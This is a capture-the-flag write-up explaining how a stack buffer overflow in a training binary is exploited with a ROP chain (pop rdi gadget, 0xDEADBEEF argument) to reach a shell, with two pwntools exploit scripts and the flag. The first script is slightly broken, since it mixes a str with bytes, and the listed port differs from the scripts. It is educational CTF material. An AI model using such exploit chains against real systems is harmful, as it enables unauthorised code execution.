# Call Me Maybe

---

### Challenge Description

> Want a shell? Just give it a call! You'll to show some verification though.

> Interact with the service at: 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg:3020

[callmemaybe.zip](https://github.com/caprinux/Cyberthon-2021-Training/files/6330465/callmemaybe.zip)

---

### Solution

Running the binary, we see that it takes in an input Contact, and calls the contact. Maybe you could try calling yourself on this service...

We look at our source code.

```c
void shell(int checker)

{
    char command[8] = "/bin/sh\x00";
    if (checker == 0xDEADBEEF) {
        system(command);
    } else {
        puts("Unauthorized.");
    }
}

int main()
{
    char contact[64];
    ... ... (some long useless ascii text)
    printf("Enter Contact => ");
    scanf("%s", contact);
    printf("Calling %s...\n", contact);
    return 0;
}

```

As we can see, it takes in an input with scanf, and does not limit the number of bytes of input. 

It stores our input into contact which only holds 64 bytes of input.

This gives us a buffer overflow.

We can also see that there is a `shell(int checker)` function which pops us a shell. This is probably our objective, to pop a shell on the remote service.

The function takes in an argument and check it against '0xDEADBEEF' to give us our shell.

How can we possibly call the shell function? If you are unsure, read this [shell](https://github.com/caprinux/Cyberthon-Training/tree/main/Livestream%20Training/shell) from Cyberthon live-stream training which talks about ret2win and goes in depth to explain it.

So the idea is that you can overflow Contact to overwrite return address and return to the Shell() function.

However, how do we send an argument to shell to pass the check and gives us our shell?

We have to go back to assembly and how arguments are taken in.

In AMD64, or 64 bit binaries, when any function is called, i.e. printf, scanf, puts etc. an argument is passed to the function. 

This argument is passed through registers, RDI, RSI, RDX.

In this case, since it only takes in 1 argument, and compares it, it will look something like this in assembly:

```asm
mov DWORD PTR [rbp-0x14], rdi
cmp DWORD PTR [rbp-0x14], 0xdeadbeef
```

The argument in RDI will be stored on the stack and compared against 0xDEADBEEF.

The question now is: How do we put an argument into the register? 

This is where [Return Oriented Programming](https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html) comes in. 

The crux of the idea is that, our binary contains many small instructions that we can return to. These small instructions are called gadgets.

Since we know how to overflow the Contact variable and take control of the return address, if we can find a gadget that does `pop RDI ; ret`, we can return to that gadget, pop a value into rdi, and then call the shell function.

How do we find ROP gadgets then? This tool will be ur best friend,[ROPGadget Tool](https://github.com/JonathanSalwan/ROPgadget).

Now that we have everything, let's think about our exploit.

Contact holds 64 bytes. So to overflow contacts and reach our return address, we will need a buffer of 64 + 8 bytes.

Next, we find our pop rdi gadget. 

![image](https://user-images.githubusercontent.com/76640319/115134028-61418600-a03f-11eb-827b-727ff99031ac.png)

Got it. Our `pop RDI ; ret` gadget is at 0x400873.

Now we find the address of our shell function.

![image](https://user-images.githubusercontent.com/76640319/115134040-7b7b6400-a03f-11eb-8978-42d6357b0157.png)

Got it. Our shell function is at 0x4006ea. 

Let's also get a `ret` gadget to make things cleaner when we return to `pop rdi` after our main() function.

![image](https://user-images.githubusercontent.com/76640319/115134093-ecbb1700-a03f-11eb-984a-fba9f41f0885.png)

Got it. Our ret gadget is at 0x40055e

Let's craft our exploit now.

```py
from pwn import * # import pwntool library

p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30201) # connect to remote service

payload = ''

payload += b"A"*64 + b"A" * 8 # overflow our buffer
payload += p64(0x40055e) # ret gadget
payload += p64(0x400873) # pop rdi gadget
payload += p64(0xDEADBEEF) # argument
payload += p64(0x4006ea) # ret to shell function

p.sendline(payload) # send payload
p.interactive() # interact with service
```

![image](https://user-images.githubusercontent.com/76640319/115134169-70750380-a040-11eb-89d6-2bc0943cfe01.png)

```
CTFSG{h3y_1_ju5t_m3t_y0u_but_1_g0t_sh3ll}
```

---

### Teaser

Could you possibly automate and find all your gadgets at runtime? 

Here was my actual exploit script I used. 

```py
from pwn import *

p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30201)
context.binary = './callmemaybe'
elf = ELF('callmemaybe')
rop = ROP(elf)

poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

ret = (rop.find_gadget(['ret']))[0]

p.sendline(b"A"*72 + p64(ret) + p64(poprdi) + p64(0xdeadbeef) + p64(elf.sym['shell']))

p.interactive()
```
